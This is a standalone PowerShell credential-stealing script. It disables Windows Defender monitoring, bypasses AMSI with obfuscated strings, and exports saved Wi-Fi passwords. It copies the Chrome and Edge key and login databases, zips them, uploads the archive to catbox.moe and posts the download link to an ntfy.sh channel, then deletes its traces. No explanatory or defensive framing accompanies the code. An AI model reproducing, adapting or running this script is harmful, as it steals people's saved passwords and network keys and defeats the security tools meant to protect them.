$a='Set-MpPreference';& $a -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
$t="data_stwealer_hide_een_";$pw="fuckthesociety123!"
$m='Man';$a='age';$me='ment';$au='Auto';$ma='mation';$am='Amsi';$u='Utils'
$ref=[Ref].Assembly.GetType("System.$m$a$me.$au$ma.$am$u")
try{$ref.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}catch{}
$tmp=Join-Path $env:TEMP ([char[]](97..122)|Get-Random -Count 10 -Join '')
New-Item $tmp -ItemType Directory -Force|Out-Null
[byte[]]$n=110,101,116,115,104;$nc=[System.Text.Encoding]::ASCII.GetString($n)
& $nc wlan export profile folder=$tmp key=clear | Out-Null
$paths=@{"CH"="$env:LOCALAPPDATA\Goo"+"gle\Chro"+"me\User Data";"ED"="$env:LOCALAPPDATA\Micro"+"soft\Edge\User Data"}
foreach($k in $paths.Keys){$ls=Join-Path $paths[$k] "Loc"+"al St"+"ate";if(Test-Path $ls){try{Copy-Item $ls -Destination "$tmp\$($k)_m.json" -Force;$db=Join-Path $paths[$k] "Default\Log"+"in Da"+"ta";if(Test-Path $db){Copy-Item $db -Destination "$tmp\$($k)_d.db" -Force}}catch{}}}
[void][Reflection.Assembly]::LoadWithPartialName("System.IO.Com"+"pression.File"+"System")
$z=Join-Path $env:TEMP ((Get-Random).ToString()+".zip")
[System.IO.Compression.ZipFile]::CreateFromDirectory($tmp,$z)
if(Test-Path $z){$r=cur"+"l.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$z" https://catbox.moe/user/api.php
if($r-match'catbox'){Invoke-RestMethod -Uri "https://ntfy.sh/$t" -Method Post -Body "Link: $r" -EA SilentlyContinue}}
Remove-Item -Recurse -Force $tmp,$z -EA SilentlyContinue
